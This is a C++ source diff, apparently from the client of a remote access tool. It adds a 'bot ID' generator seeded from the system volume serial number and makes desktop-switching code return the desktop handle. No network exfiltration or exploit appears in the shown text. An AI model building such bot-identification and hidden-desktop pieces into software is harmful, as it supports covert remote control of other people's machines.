@@ -14,7 +14,7 @@ typedef struct {
 	HANDLE	hEventTransferArg;
 } THREAD_ARGLIST, * LPTHREAD_ARGLIST;
 
-BOOL SelectDesktop(TCHAR* name);
+HDESK SelectDesktop(TCHAR* name);
 
 unsigned int __stdcall ThreadLoader(LPVOID param)
 {
@@ -54,6 +54,41 @@ HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
 	return hThread;
 }
 
+ULONG PseudoRand(ULONG* seed)
+{
+	return (*seed = 1352459 * (*seed) + 2529004207);
+}
+
+std::string GetBotId()
+{
+#define _T(p) p
+	TCHAR botId[35] = { 0 };
+	TCHAR windowsDirectory[MAX_PATH] = {};
+	TCHAR volumeName[8] = { 0 };
+	DWORD seed = 0;
+
+	if (GetWindowsDirectory(windowsDirectory, sizeof(windowsDirectory)))
+		windowsDirectory[0] = _T('C');
+
+	volumeName[0] = windowsDirectory[0];
+	volumeName[1] = _T(':');
+	volumeName[2] = _T('\\');
+	volumeName[3] = _T('\0');
+
+	GetVolumeInformation(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);
+
+	GUID guid = {};
+	guid.Data1 = PseudoRand(&seed);
+
+	guid.Data2 = (USHORT)PseudoRand(&seed);
+	guid.Data3 = (USHORT)PseudoRand(&seed);
+	for (int i = 0; i < 8; i++)
+		guid.Data4[i] = (UCHAR)PseudoRand(&seed);
+	wsprintf(botId, _T("%08lX%04lX%lu"), guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
+	return botId;
+#undef _T(p)
+}
+
 BOOL SelectHDESK(HDESK new_desktop)
 {
 	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
@@ -80,9 +115,9 @@ BOOL SelectHDESK(HDESK new_desktop)
 // Switches the current thread into a different desktop, by name
 // Calling with a valid desktop name will place the thread in that desktop.
 // Calling with a NULL name will place the thread in the current input desktop.
-BOOL SelectDesktop(TCHAR* name)
+HDESK SelectDesktop(TCHAR* name)
 {
-	HDESK desktop;
+	HDESK desktop = NULL;
 
 	if (name != NULL) {
 		// Attempt to open the named desktop
@@ -103,18 +138,18 @@ BOOL SelectDesktop(TCHAR* name)
 
 	// Did we succeed?
 	if (desktop == NULL) {
-		return FALSE;
+		return NULL;
 	}
 
 	// Switch to the new desktop
 	if (!SelectHDESK(desktop)) {
 		// Failed to enter the new desktop, so free it!
 		CloseDesktop(desktop);
-		return FALSE;
+		return NULL;
 	}
 
 	// We successfully switched desktops!
-	return TRUE;
+	return desktop;
 }
 
 //////////////////////////////////////////////////////////////////////
@@ -123,6 +158,7 @@ BOOL SelectDesktop(TCHAR* name)
 
 CManager::CManager(IOCPClient* ClientObject) : g_bExit(ClientObject->g_bExit)
 {
+	m_bReady = TRUE;
 	m_ClientObject = ClientObject;
 	m_ClientObject->setManagerCallBack(this, IOCPManager::DataProcess);
 
